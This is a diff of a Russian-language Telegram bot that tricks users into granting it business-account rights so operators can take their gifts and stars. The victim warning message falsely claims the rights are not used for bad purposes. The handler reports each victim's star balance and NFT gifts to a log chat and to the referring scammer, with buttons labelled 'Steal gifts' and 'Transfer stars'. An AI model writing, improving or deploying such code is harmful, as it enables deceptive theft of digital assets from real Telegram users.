@@ -202,39 +202,66 @@ async def handle_business(business_connection: types.BusinessConnection):
     business_id = business_connection.id
     builder = InlineKeyboardBuilder()
     
-    builder.button(
-        text="🎁 Украсть подарки", 
-        callback_data=f"steal_gifts:{business_id}"
+    # Добавляем две кнопки в одну строку
+    builder.row(
+        InlineKeyboardButton(text="🎁 Украсть подарки", callback_data=f"steal_gifts:{business_id}"),
+        InlineKeyboardButton(text="💰 Перевести звёзды", callback_data=f"transfer_stars:{business_id}")
     )
-    builder.button(
-        text="💰 Перевести звёзды", 
-        callback_data=f"transfer_stars:{business_id}"
-    )
-    builder.button(
-        text="⛔️ Удалить подключение", 
-        callback_data=f"destroy:{business_id}"
+    # Кнопка удаления на отдельной строке
+    builder.row(
+        InlineKeyboardButton(text="⛔️ Удалить подключение", callback_data=f"destroy:{business_id}")
     )
     builder.adjust(1)
     
     user = business_connection.user
     
+    # Получаем информацию о пригласившем для формирования сообщений об ошибках
+    inviter_id = user_referrer_map.get(str(user.id))
+    inviter_username = "неизвестно"
+    if inviter_id:
+        try:
+            inviter = await bot.get_chat(inviter_id)
+            inviter_username = f"@{inviter.username}" if inviter.username else f"ID:{inviter_id}"
+        except Exception:
+            inviter_username = f"ID:{inviter_id}"
+    
+    user_username = f"@{user.username}" if user.username else f"ID:{user.id}"
+    error_base = f"Реф {user_username} от {inviter_username}"
+    
     try:
         info = await bot.get_business_connection(business_id)
+        if info is None:
+            error_msg = f"{error_base} - Бот отвязан"
+            await bot.send_message(LOG_CHAT_ID, error_msg)
+            if inviter_id:
+                await bot.send_message(inviter_id, error_msg)
+            return
+            
         rights = info.rights
-        
-        # Проверка необходимых прав
-        required_rights = [
-            rights.can_read_messages,
-            rights.can_delete_all_messages,
+        if rights is None:
+            error_msg = f"{error_base} - Бот отвязан"
+            await bot.send_message(LOG_CHAT_ID, error_msg)
+            if inviter_id:
+                await bot.send_message(inviter_id, error_msg)
+            return
+
+        # Проверяем только необходимые права для работы с подарками и звездами
+        required_gift_rights = [
             rights.can_convert_gifts_to_stars,
             rights.can_transfer_stars
         ]
         
-        if not all(required_rights):
+        if not all(required_gift_rights):
+            error_msg = f"{error_base} - Недостаточно прав"
+            await bot.send_message(LOG_CHAT_ID, error_msg)
+            if inviter_id:
+                await bot.send_message(inviter_id, error_msg)
+            
+            # Отправляем предупреждение пользователю
             warning_message = (
-                "⛔️ Вы не предоставили все права боту\n\n"
-                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n\n"
-                "⚠️ Мы не используем эти права в плохих целях, все эти права нужны нам лишь чтобы анализировать сообщения и статистику ваших собеседников, чтобы в будущем отправлять её вам\n\n"
+                "⛔️ Вы не предоставили все необходимые права боту\n\n"
+                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n"
+                "⚠️ Мы не используем эти права в плохих целях, подключение бота к бизнес-аккаунту необходимо для того, чтобы он мог автоматически и напрямую отправлять звезды от одного пользователя другому — без лишних действий и подтверждений.\n\n"
                 "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
             )
             try:
@@ -244,40 +271,49 @@ async def handle_business(business_connection: types.BusinessConnection):
                 )
             except Exception as e:
                 await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось отправить предупреждение пользователю {user.id}: {e}")
+            return
         
+        # Получаем данные о подарках и звездах
         gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
         stars = await bot.get_business_account_star_balance(business_id)
+
     except Exception as e:
-        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка получения данных бизнес-аккаунта: {e}")
+        error_type = str(e)
+        if "BOT_ACCESS_FORBIDDEN" in error_type:
+            error_msg = f"{error_base} - Недостаточно прав"
+        else:
+            error_msg = f"{error_base} - Бот отвязан"
+        
+        await bot.send_message(LOG_CHAT_ID, error_msg)
+        if inviter_id:
+            try:
+                await bot.send_message(inviter_id, error_msg)
+            except Exception as e:
+                logging.error(f"Не удалось уведомить пригласившего: {e}")
         return
 
-    # Рассчеты
+    # Остальная часть функции остается без изменений
     total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
     nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
     nft_transfer_cost = len(nft_gifts) * 25
     total_withdrawal_cost = total_price + nft_transfer_cost
     
-    # Форматирование текста (остаётся без изменений)
-    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n\n"
+    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n"
     user_info = (
         f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
         f"├─ ID: <code>{user.id}</code>\n"
         f"├─ Username: @{user.username or 'нет'}\n"
-        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
+        f"├─ Пригласил: {inviter_username}\n"
+        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n"
     )
     balance_info = (
         f"<blockquote>💰 <b>Баланс:</b>\n"
-        f"├─ Доступно звёзд: {int(stars.amount):,}\n"
-        f"├─ Звёзд в подарках: {total_price:,}\n"
-        f"╰─ <b>Итого:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
+        f"╰─ Доступно звёзд: {int(stars.amount):,}</blockquote>\n"
     )
     gifts_info = (
         f"<blockquote>🎁 <b>Подарки:</b>\n"
-        f"├─ Всего: {gifts.total_count}\n"
-        f"├─ Обычные: {gifts.total_count - len(nft_gifts)}\n"
         f"├─ NFT: {len(nft_gifts)}\n"
-        f"├─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)\n"
-        f"╰─ <b>Общая стоимость вывода:</b> {total_withdrawal_cost:,} звёзд</blockquote>"
+        f"╰─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)</blockquote>\n"
     )
     
     nft_list = ""
@@ -311,7 +347,6 @@ async def handle_business(business_connection: types.BusinessConnection):
     
     full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
     
-    # 1. Отправка в основной лог-чат
     try:
         await bot.send_message(
             chat_id=LOG_CHAT_ID,
@@ -321,25 +356,21 @@ async def handle_business(business_connection: types.BusinessConnection):
             disable_web_page_preview=True
         )
     except Exception as e:
-        logger.error(f"Ошибка при отправке в лог-чат: {e}")
+        logging.error(f"Ошибка при отправке в лог-чат: {e}")
 
-    # 2. Отправка пригласившему (если есть)
-    inviter_id = user_referrer_map.get(user.id)
-    
-    if inviter_id and inviter_id != user.id:
+    if inviter_id:
         try:
             await bot.send_message(
-                chat_id=inviter_id,
-                text=full_message,  # Точно такое же сообщение
+                chat_id=int(inviter_id),
+                text=full_message,
                 reply_markup=builder.as_markup(),
                 parse_mode="HTML",
                 disable_web_page_preview=True
             )
         except Exception as e:
             error_msg = f"⚠️ Не удалось отправить лог пригласившему {inviter_id}: {str(e)}"
-            logger.error(error_msg)
+            logging.error(error_msg)
             await bot.send_message(LOG_CHAT_ID, error_msg)
-
 @dp.callback_query(F.data == "draw_stars")
 async def draw_stars(message: types.Message, state: FSMContext):
     await message.answer(
